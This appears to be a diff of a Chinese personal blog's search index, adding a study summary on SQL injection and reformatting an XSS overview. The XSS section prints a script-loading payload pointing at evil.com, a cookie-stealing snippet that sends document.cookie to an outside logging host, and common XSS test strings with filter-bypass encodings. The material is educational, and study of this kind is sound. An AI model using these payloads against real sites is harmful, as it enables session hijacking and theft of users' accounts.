@@ -1,6 +1,98 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>web安全学习总结——SQL注入概述</title>
+    <url>/2020/02/26/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<center>圣人之道，为而不争</center>
+
+<p><img src="https://i.loli.net/2020/02/26/RmkuazI2SvYyNod.png" alt="origindddal.png"></p>
+<a id="more"></a>
+
+<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><h2 id="SQL语言"><a href="#SQL语言" class="headerlink" title="SQL语言"></a>SQL语言</h2><blockquote>
+<p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
+</blockquote>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote>
+<p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+</blockquote>
+<h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><blockquote>
+<p>没有对用户的输入输出进行安全过滤，导致后台直接将用户的输入作为SQL语句的一部分，执行操作，产生危害</p>
+<p>通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+</blockquote>
+<h1 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h1><h2 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h2><ul>
+<li>​    基于错误的SQL注入</li>
+<li>​    联合查询的类型</li>
+<li>​    堆查询注射</li>
+<li>​    SQL 盲注<ul>
+<li>基于布尔SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+</li>
+</ul>
+<h2 id="基于如何处理输入的SQL查询-数据类型"><a href="#基于如何处理输入的SQL查询-数据类型" class="headerlink" title="基于如何处理输入的SQL查询(数据类型)"></a>基于如何处理输入的SQL查询(数据类型)</h2><ul>
+<li>基于字符串</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+<h2 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h2><ul>
+<li>一阶注入</li>
+</ul>
+<blockquote>
+<p>一阶注入是指输入的注射语句对WEB直接产生了影响，出现了结果。</p>
+</blockquote>
+<ul>
+<li>二阶注入</li>
+</ul>
+<blockquote>
+<p>二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其他的辅助间接的对WEB产生危害，这样的就被成为是二阶注入</p>
+</blockquote>
+<h2 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h2><ul>
+<li>通过用户输入的表单域的注射</li>
+<li>通过Cookie注射</li>
+<li>通过服务器变量注射。（基于头部信息的注射）</li>
+</ul>
+<h1 id="0x04-漏洞危害"><a href="#0x04-漏洞危害" class="headerlink" title="0x04 漏洞危害"></a>0x04 漏洞危害</h1><p>危害非常高，例如：</p>
+<ul>
+<li>数据库信息泄露</li>
+<li>网页篡改</li>
+<li>网站被挂马，传播恶意软件</li>
+<li>数据库被恶意操纵</li>
+<li>服务器被远程控制，被安葬后门</li>
+<li>破坏硬盘数据，瘫痪全系统</li>
+</ul>
+<h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05 漏洞防御"></a>0x05 漏洞防御</h1><h2 id="注入原因"><a href="#注入原因" class="headerlink" title="注入原因"></a>注入原因</h2><ul>
+<li>不正当的类型处理</li>
+<li>不安全的数据库配置</li>
+<li>不合理的查询集处理</li>
+<li>不当的错误处理</li>
+<li>转义字符处理不合适</li>
+<li>多个提交处理不当</li>
+</ul>
+<h2 id="存在位置"><a href="#存在位置" class="headerlink" title="存在位置"></a>存在位置</h2><ul>
+<li>任何客户端可控，传递到服务器的变量</li>
+<li>必须带有参数传递，参数值带入到数据库查询</li>
+<li>服务器没有进行过滤或者过滤不严格</li>
+</ul>
+<h2 id="代码层面防御"><a href="#代码层面防御" class="headerlink" title="代码层面防御"></a>代码层面防御</h2><blockquote>
+<p>对用户输入的内容进行转义（PHP中addslashes()、mysql_real_escape()函数）。<br>限制关键字的输入（PHP中preg_replace()函数正则替换关键字），限制输入的长度 。<br>使用SQL语句预处理，对SQL语句首先进行预编译，然后进行参数绑定，最后传入参数。</p>
+</blockquote>
+<h2 id="网络层面防御"><a href="#网络层面防御" class="headerlink" title="网络层面防御"></a>网络层面防御</h2><blockquote>
+<p>部署防火墙</p>
+</blockquote>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/xiaoqiyue/p/9026859.html" target="_blank" rel="noopener">SQL注入</a></p>
+<p><a href="https://www.cnblogs.com/lsdb/p/9612424.html" target="_blank" rel="noopener">SQL注入理解与防御</a></p>
+<p><a href="https://xz.aliyun.com/t/5878#toc-51" target="_blank" rel="noopener">[红日安全]Web安全Day1 - SQL注入实战攻防</a></p>
+<p><a href="https://blog.csdn.net/BeatRex/article/details/91901196" target="_blank" rel="noopener">SQL注入分类、防御</a></p>
+]]></content>
+      <categories>
+        <category>Web安全学习总结</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>学习总结</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web安全学习总结—文件上传漏洞概述</title>
     <url>/2020/02/10/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
     <content><![CDATA[<center>知之始己，自知而后知人也。</center>
@@ -82,8 +174,8 @@
       </tags>
   </entry>
   <entry>
-    <title>Web安全学习总结——XSS漏洞概述</title>
-    <url>/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
+    <title>Web安全学习总结—XSS漏洞概述</title>
+    <url>/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
     <content><![CDATA[<center>敦兮其若朴，旷兮其若谷</center>
 
 <p><img src="https://i.loli.net/2020/01/06/3vFUh1Z5mVB8gKW.png" alt="preview.png"></p>
@@ -102,26 +194,45 @@
 <p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。</p>
 </blockquote>
 <h3 id="盗取Cookie"><a href="#盗取Cookie" class="headerlink" title="盗取Cookie"></a>盗取Cookie</h3><p>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xssTest&#x2F;test.php?userName&#x3D;&lt;scriipt src&#x3D;http:&#x2F;&#x2F;www.evil.com&#x2F;evil.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/xssTest/test.php?userName=&lt;scriipt src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://www.xxxx.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);  </span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
 
 <p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。<br>一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。</p>
 <h3 id="蠕虫攻击"><a href="#蠕虫攻击" class="headerlink" title="蠕虫攻击"></a>蠕虫攻击</h3><p>可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用</p>
-<h3 id="常用XSS语句"><a href="#常用XSS语句" class="headerlink" title="常用XSS语句"></a>常用XSS语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;);&lt;&#x2F;script&gt; &#x2F;&#x2F;经典语句</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD&#x3D;alert(&#39;XSS&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href &#x3D; javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="常用XSS语句"><a href="#常用XSS语句" class="headerlink" title="常用XSS语句"></a>常用XSS语句</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//经典语句</span></span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(<span class="string">'XSS'</span>)&gt;</span><br><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href = javasript:alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="0x04-漏洞绕过"><a href="#0x04-漏洞绕过" class="headerlink" title="0x04 漏洞绕过"></a>0x04 漏洞绕过</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
 <p>比如：</p>
-<script>alert(“xss”);</script>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(“xss”);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
 <p>可以转换为：</p>
-<ScRipt>ALeRt(“XSS”);</sCRipT>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;ScRipt&gt;ALeRt(“XSS”);<span class="xml"><span class="tag">&lt;/<span class="name">sCRipT</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="关闭标签"><a href="#关闭标签" class="headerlink" title="关闭标签"></a>关闭标签</h3><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
-<p>比如：“&gt;<script>alert(“Hi”);</script></p>
+<p>比如: </p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(“Hi”);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="使用hex编码绕过"><a href="#使用hex编码绕过" class="headerlink" title="使用hex编码绕过"></a>使用hex编码绕过</h3><p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
-<p>比如：<script>alert(“xss”);</script>可以转换为：<br>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</p>
+<p>比如：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(“xss”);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以转换为：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">3</span>c%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>e%<span class="number">61</span>%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">28</span>%<span class="number">22</span>%<span class="number">78</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>b%<span class="number">3</span>c%<span class="number">2</span>f%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">3</span>e</span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p>三个八进制数；如果不够前面补0<br>两个十六进制数字；如果不够前面补0<br>四个十六进制数字；如果不够前面补0<br>控制字符</p>
 <h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>以<code>&amp;</code>开始<code>;</code>结束</p>
 <h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>%27<br>考虑HTML的渲染方式选择合适的编码方式进行测试</p>
